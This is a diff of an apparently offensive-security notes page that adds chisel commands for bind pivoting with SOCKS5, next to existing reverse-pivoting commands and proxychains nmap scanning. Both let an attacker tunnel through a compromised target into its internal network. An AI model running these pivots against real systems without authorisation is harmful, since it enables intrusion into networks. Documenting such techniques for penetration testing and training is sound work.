@@ -202,7 +202,7 @@ start-dnscat2 <span class="nt">-dnsserver</span> &lt;attack box IP&gt; <span cla
 <p>for compatibility with powershell-empire, use chisel 1.7.2.</p>
 
 <div class="highlight"><pre class="highlight shell"><code><span class="c">################</span>
-<span class="c"># with SOCKS5</span>
+<span class="c"># reverse pivoting with SOCKS5</span>
 <span class="c">################</span>
 
 <span class="c"># on your attack machine, run:</span>
@@ -213,6 +213,20 @@ chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:&lt;proxyc
 
 <span class="c"># then prepend any command with proxychains</span>
 proxychains nmap &lt;...&gt;
+
+<span class="c">################</span>
+<span class="c"># bind pivoting with SOCKS5</span>
+<span class="c">################</span>
+
+<span class="c"># if the target doesn't have a firewall restricting</span>
+<span class="c"># inbound connections, we might not have to use</span>
+<span class="c"># reverse pivoting.</span>
+
+<span class="c"># on the target, run:</span>
+chisel server <span class="nt">-p</span> 1234 <span class="nt">--socks5</span>
+
+<span class="c"># on your attack machine, run:</span>
+chisel client &lt;target IP&gt;:1234 &lt;proxychains_port&gt;:socks
 </code></pre></div>
 
 <h2>references</h2>
